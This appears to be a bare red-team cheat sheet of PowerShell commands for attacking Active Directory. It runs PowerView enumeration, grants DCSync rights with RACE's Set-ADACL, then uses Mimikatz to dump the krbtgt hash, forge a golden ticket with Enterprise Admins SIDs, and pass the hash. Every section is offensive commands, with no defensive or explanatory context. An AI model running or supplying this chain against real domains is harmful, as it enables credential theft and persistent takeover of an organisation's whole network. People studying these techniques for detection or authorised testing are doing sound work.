### Enumeration
```
Get-DomainUser xxxx | Format-Table samaccountname,memberof
Get-NetGroup organizationadmins | Format-Table displayname,samaccountname,member
Get-ObjectAcl -Domain xxxxx -SamAccountName xxxx 
Get-ObjectAcl -Domain xxxx -SamAccountName xxxxx | Format-Table ObjectDN,ActiveDirectoryRights
Get-ObjectAcl -SamAccountName xxxx
Get-NetGroup xxxx
```

### dcsync privilege escalation
```
Import-Module .\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
. .\RACE.ps1
Set-ADACL -DistinguishedName 'DC=xxx,DC=xxxx,DC=xxxx' -SamAccountName John -GUIDRight DCSync -Verbose

```
###  Extractiong the KRBTGT Hash upon adding the join to DCSync Rights
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:HR\krbtgt"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:x.x.x.x /sid:<> /krbtgt:<> /sids:<>-519 /ptt"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:xxx /domain:xxx.xxx /ntlm:<> /run:powershell.exe"'

```
